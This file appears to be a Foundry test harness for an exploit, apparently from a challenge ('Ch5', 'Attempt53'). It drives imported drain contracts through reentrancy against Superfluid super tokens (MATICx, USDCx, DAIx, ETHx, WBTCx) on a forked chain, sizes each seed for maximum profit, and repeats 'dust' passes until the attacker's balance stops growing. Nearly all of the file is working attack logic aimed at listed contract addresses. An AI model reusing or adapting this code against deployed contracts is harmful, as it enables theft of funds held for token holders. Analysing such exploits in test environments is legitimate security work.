// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {
    Ch5Drain,
    Ch5ERC20Drain,
    ISuperToken,
    IERC20Minimal,
    IQuickSwapRouter
} from "../exploit/Run.s.sol";

/// @notice Reset-head validation for the higher-reentry `Run.s.sol` path.
///         This mirrors the exploit wrapper after raising the ERC20 helper
///         reentry count to 50 and folding dust continuation passes into the
///         main run sequence.
contract Attempt53HighReentryResetRunTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant ETHX = 0x27e1e4E6BC79D93032abef01025811B7E4727e85;
    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;

    uint256 internal constant NATIVE_REENTRY_COUNT = 10;
    uint256 internal constant NATIVE_PHASE1_ROUNDS = 4;
    uint256 internal constant NATIVE_GAS_RESERVE = 0.02 ether;
    uint256 internal constant NATIVE_BACKING_MARGIN = 1 gwei;

    uint256 internal constant MAX_REENTRY_COUNT = 50;
    uint256 internal constant MAX_ROUNDS_PER_HELPER = 1;
    uint256 internal constant MAX_DUST_PASSES = 4;
    uint256 internal constant GAS_RESERVE = 5 ether;

    uint256 internal constant USDC_BOOTSTRAP_FLOOR = 250 ether;
    uint256 internal constant DAI_BOOTSTRAP_FLOOR = 250 ether;
    uint256 internal constant ETH_BOOTSTRAP_FLOOR = 250 ether;
    uint256 internal constant WBTC_BOOTSTRAP_FLOOR = 250 ether;
    uint256 internal constant BUY_MIN_BPS = 9_900;
    uint256 internal constant SELL_MIN_BPS = 9_900;
    uint256 internal constant DUST_PROFIT_MARGIN = 0.01 ether;

    uint32 internal constant USDC_INDEX_BASE = 820_000_000;
    uint32 internal constant DAI_INDEX_BASE = 830_000_000;
    uint32 internal constant ETH_INDEX_BASE = 835_000_000;
    uint32 internal constant WBTC_INDEX_BASE = 840_000_000;
    uint32 internal constant USDC_DUST_INDEX_BASE = 920_000_000;
    uint32 internal constant DAI_DUST_INDEX_BASE = 930_000_000;
    uint32 internal constant ETH_DUST_INDEX_BASE = 935_000_000;
    uint32 internal constant WBTC_DUST_INDEX_BASE = 940_000_000;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_reset_head_high_reentry_run_increases_native_balance() public {
        uint256 nativeBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        _runNativeStage();

        uint256 nativeAfterMaticx = ATTACKER.balance;
        uint256 requiredBootstrap =
            USDC_BOOTSTRAP_FLOOR + DAI_BOOTSTRAP_FLOOR + ETH_BOOTSTRAP_FLOOR + WBTC_BOOTSTRAP_FLOOR + GAS_RESERVE;
        assertGt(nativeAfterMaticx, requiredBootstrap, "insufficient native after MATICx");

        uint256 usdcBootstrap = _recommendedBootstrapNative(USDCX, nativeAfterMaticx, USDC_BOOTSTRAP_FLOOR);
        uint256 daiBootstrap = _recommendedBootstrapNative(DAIX, nativeAfterMaticx, DAI_BOOTSTRAP_FLOOR);
        uint256 ethBootstrap = _recommendedBootstrapNative(ETHX, nativeAfterMaticx, ETH_BOOTSTRAP_FLOOR);
        uint256 wbtcBootstrap = _recommendedBootstrapNative(WBTCX, nativeAfterMaticx, WBTC_BOOTSTRAP_FLOOR);

        _drainToken("USDCx", USDCX, USDC_INDEX_BASE, usdcBootstrap);
        _drainToken("DAIx", DAIX, DAI_INDEX_BASE, daiBootstrap);
        _drainToken("ETHx", ETHX, ETH_INDEX_BASE, ethBootstrap);
        _drainToken("WBTCx", WBTCX, WBTC_INDEX_BASE, wbtcBootstrap);

        for (uint256 pass = 0; pass < MAX_DUST_PASSES; ++pass) {
            uint256 nativeBeforePass = ATTACKER.balance;
            console.log("dust continuation pass:", pass + 1);

            _drainDustTokenIfProfitable("USDCx dust", USDCX, USDC_DUST_INDEX_BASE);
            _drainDustTokenIfProfitable("DAIx dust", DAIX, DAI_DUST_INDEX_BASE);
            _drainDustTokenIfProfitable("ETHx dust", ETHX, ETH_DUST_INDEX_BASE);
            _drainDustTokenIfProfitable("WBTCx dust", WBTCX, WBTC_DUST_INDEX_BASE);

            if (ATTACKER.balance == nativeBeforePass) {
                console.log("dust continuation exhausted");
                break;
            }
        }
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance should strictly increase");
    }

    function _runNativeStage() internal {
        uint256 nativeSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
        require(nativeSeed > 0, "no profitable native round");

        Ch5Drain nativeDrain = new Ch5Drain();
        nativeDrain.executeRound{value: nativeSeed}(NATIVE_REENTRY_COUNT);

        for (uint256 i = 1; i < NATIVE_PHASE1_ROUNDS; ++i) {
            uint256 nextSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
            if (nextSeed == 0) {
                break;
            }

            nativeDrain.executeRound{value: nextSeed}(NATIVE_REENTRY_COUNT);
        }

        uint256 nativePhase2Seed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
        if (nativePhase2Seed > 0) {
            Ch5Drain nativePhase2Drain = new Ch5Drain();
            nativePhase2Drain.executeRound{value: nativePhase2Seed}(NATIVE_REENTRY_COUNT);
        }
    }

    function _computeNativeSeed(uint256 attackerNative, uint256 maticxBackingBefore) internal pure returns (uint256) {
        if (attackerNative <= NATIVE_GAS_RESERVE) {
            return 0;
        }

        uint256 spendable = attackerNative - NATIVE_GAS_RESERVE;
        uint256 safeByBacking = maticxBackingBefore / NATIVE_REENTRY_COUNT;
        if (safeByBacking <= NATIVE_BACKING_MARGIN) {
            return 0;
        }

        unchecked {
            safeByBacking -= NATIVE_BACKING_MARGIN;
        }

        return spendable < safeByBacking ? spendable : safeByBacking;
    }

    function _drainToken(string memory label, address superToken, uint32 indexBase, uint256 bootstrapNative) internal {
        address underlying = ISuperToken(superToken).getUnderlyingToken();
        uint256 nativeBeforeAll = ATTACKER.balance;
        uint256 initialBacking = IERC20Minimal(underlying).balanceOf(superToken);
        if (initialBacking <= 1) {
            console.log(label);
            console.log("backing already empty, skipping");
            return;
        }

        console.log(label);
        console.log("attacker native before token:", nativeBeforeAll);
        console.log("underlying backing before:", initialBacking);
        console.log("bootstrap native:", bootstrapNative);

        Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) =
            drain.executeDrain{value: bootstrapNative}(MAX_ROUNDS_PER_HELPER, MAX_REENTRY_COUNT);

        uint256 nativeAfterAll = ATTACKER.balance;
        uint256 backingAfter = IERC20Minimal(underlying).balanceOf(superToken);

        console.log("rounds executed:", roundsExecuted);
        console.log("helper native out:", nativeOut);
        console.log("token native delta:", nativeAfterAll - nativeBeforeAll);
        console.log("underlying backing final:", backingAfter);

        assertGt(roundsExecuted, 0, "no rounds executed");
        assertGt(nativeAfterAll, nativeBeforeAll, "token drain was not profitable");
        assertLt(backingAfter, initialBacking, "token backing unchanged");
    }

    function _drainDustTokenIfProfitable(string memory label, address superToken, uint32 indexBase) internal {
        address underlying = ISuperToken(superToken).getUnderlyingToken();
        uint256 nativeBeforeAll = ATTACKER.balance;
        uint256 initialBacking = IERC20Minimal(underlying).balanceOf(superToken);
        if (initialBacking <= 1) {
            console.log(label);
            console.log("backing already empty, skipping");
            return;
        }

        uint256 spendableNative = nativeBeforeAll > GAS_RESERVE ? nativeBeforeAll - GAS_RESERVE : 0;
        if (spendableNative == 0) {
            console.log(label);
            console.log("no spendable native, skipping");
            return;
        }

        uint256 targetUnderlying = initialBacking / (MAX_REENTRY_COUNT + 2);
        if (targetUnderlying == 0) {
            console.log(label);
            console.log("target underlying rounded to zero, skipping");
            return;
        }

        uint256 bootstrapNative = _bootstrapForTargetUnderlying(underlying, targetUnderlying, spendableNative);
        if (bootstrapNative == 0 || bootstrapNative > spendableNative) {
            console.log(label);
            console.log("bootstrap unavailable, skipping");
            return;
        }

        (bool expectedProfit, uint256 expectedNativeOut, uint256 bootstrapUnderlying) =
            _quoteDustRound(underlying, initialBacking, targetUnderlying, bootstrapNative);

        console.log(label);
        console.log("attacker native before token:", nativeBeforeAll);
        console.log("underlying backing before:", initialBacking);
        console.log("target underlying:", targetUnderlying);
        console.log("bootstrap native:", bootstrapNative);
        console.log("bootstrap underlying quote:", bootstrapUnderlying);
        console.log("expected native out quote:", expectedNativeOut);

        if (!expectedProfit) {
            console.log("quoted round below profit margin, skipping");
            return;
        }

        Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) =
            drain.executeDrain{value: bootstrapNative}(MAX_ROUNDS_PER_HELPER, MAX_REENTRY_COUNT);

        uint256 nativeAfterAll = ATTACKER.balance;
        uint256 backingAfter = IERC20Minimal(underlying).balanceOf(superToken);

        console.log("rounds executed:", roundsExecuted);
        console.log("helper native out:", nativeOut);
        console.log("token native delta:", nativeAfterAll - nativeBeforeAll);
        console.log("underlying backing final:", backingAfter);

        assertGt(roundsExecuted, 0, "no rounds executed");
        assertGt(nativeAfterAll, nativeBeforeAll, "token dust drain was not profitable");
        assertLt(backingAfter, initialBacking, "token backing unchanged");
    }

    function _recommendedBootstrapNative(address superToken, uint256 attackerNative, uint256 bootstrapFloor)
        internal
        view
        returns (uint256 bootstrapNative)
    {
        address underlying = ISuperToken(superToken).getUnderlyingToken();
        uint256 spendableNative = attackerNative > GAS_RESERVE ? attackerNative - GAS_RESERVE : 0;
        if (spendableNative == 0) {
            return 0;
        }

        uint256 backing = IERC20Minimal(underlying).balanceOf(superToken);
        uint256 targetUnderlying = backing / (MAX_REENTRY_COUNT + 2);
        bootstrapNative = _bootstrapForTargetUnderlying(underlying, targetUnderlying, spendableNative);

        if (bootstrapNative < bootstrapFloor) {
            bootstrapNative = bootstrapFloor;
        }
        if (bootstrapNative > spendableNative) {
            bootstrapNative = spendableNative;
        }
    }

    function _bootstrapForTargetUnderlying(address underlying, uint256 targetUnderlying, uint256 maxNative)
        internal
        view
        returns (uint256 bootstrapNative)
    {
        if (targetUnderlying == 0 || maxNative == 0) {
            return 0;
        }

        uint256 quotedMax = _quoteNativeForUnderlying(underlying, maxNative);
        if (quotedMax <= targetUnderlying) {
            return maxNative;
        }

        uint256 low = 1;
        uint256 high = maxNative;
        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quoted = _quoteNativeForUnderlying(underlying, mid);
            if (quoted >= targetUnderlying) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        bootstrapNative = low + (low / 20) + 0.1 ether;
    }

    function _quoteDustRound(address underlying, uint256 backingUnderlying, uint256 seedUnderlying, uint256 bootstrapNative)
        internal
        view
        returns (bool expectedProfit, uint256 expectedNativeOut, uint256 bootstrapUnderlying)
    {
        bootstrapUnderlying = (_quoteNativeForUnderlying(underlying, bootstrapNative) * BUY_MIN_BPS) / 10_000;
        if (bootstrapUnderlying <= seedUnderlying) {
            return (false, 0, bootstrapUnderlying);
        }

        uint256 expectedUnderlyingAfter = bootstrapUnderlying + backingUnderlying - (seedUnderlying * 2);
        expectedNativeOut = (_quoteUnderlyingForNative(underlying, expectedUnderlyingAfter) * SELL_MIN_BPS) / 10_000;
        expectedProfit = expectedNativeOut > bootstrapNative + DUST_PROFIT_MARGIN;
    }

    function _quoteNativeForUnderlying(address underlying, uint256 amountIn) internal view returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = WMATIC;
        path[1] = underlying;
        amountOut = IQuickSwapRouter(ROUTER).getAmountsOut(amountIn, path)[1];
    }

    function _quoteUnderlyingForNative(address underlying, uint256 amountIn) internal view returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = underlying;
        path[1] = WMATIC;
        amountOut = IQuickSwapRouter(ROUTER).getAmountsOut(amountIn, path)[1];
    }
}
